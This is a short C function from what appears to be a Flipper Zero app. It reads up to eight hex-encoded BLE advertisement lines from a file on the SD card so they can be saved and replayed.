// #5: BLE adv library — save/replay multiple adverts in /ext/petrel/adv.txt (one hex/line).
static int petrel_adv_load(char lines[8][80]) {
    int n = 0;
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, "/ext/petrel/adv.txt", FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[640];
        size_t rd = storage_file_read(f, buf, sizeof(buf) - 1);
        buf[rd] = '\0';
        storage_file_close(f);
        size_t i = 0;
        while(n < 8) {
            while(i < rd && (buf[i] == '\r' || buf[i] == '\n')) i++;
            if(i >= rd) break;
            size_t s = i;
            while(i < rd && buf[i] != '\r' && buf[i] != '\n') i++;
            size_t len = i - s;
            if(len > 79) len = 79;
            memcpy(lines[n], buf + s, len);
            lines[n][len] = '\0';
            n++;
        }
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    return n;
}

